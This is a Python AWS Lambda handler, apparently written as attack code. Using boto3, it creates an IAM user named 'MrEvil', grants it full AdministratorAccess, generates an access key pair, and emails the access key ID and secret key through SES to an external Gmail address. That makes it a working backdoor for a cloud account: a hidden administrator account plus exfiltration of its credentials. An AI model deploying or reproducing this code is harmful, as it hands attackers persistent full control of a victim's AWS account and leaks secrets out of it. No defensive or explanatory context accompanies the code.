from os import access
import boto3

iam = boto3.client('iam')
ses = boto3.client('ses')


def handler(event, context):
    USERNAME = "MrEvil"

    iam.create_user(
        UserName=USERNAME
    )

    iam.attach_user_policy(
        UserName=USERNAME,
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )

    response = iam.create_access_key(
        UserName=USERNAME
    )

    access_key = response["AccessKey"]["AccessKeyId"]
    secret_key = response["AccessKey"]["SecretAccessKey"]

    body_html = f"""<html>
    <head></head>
    <body>
    AccessKey={ access_key }
    SecretKey={ secret_key }
    </body>
    </html>
    """

    email_message = {
        'Body': {
            'Html': {
                'Charset': 'utf-8',
                'Data': body_html,
            },
        },
        'Subject': {
            'Charset': 'utf-8',
            'Data': "Hello from AWS SES",
        },
    }

    from_email = "1.david.michael@gmail.com"

    ses.send_email(
        Destination={
            "ToAddresses": [from_email]
        },
        Message=email_message,
        Source=from_email
    )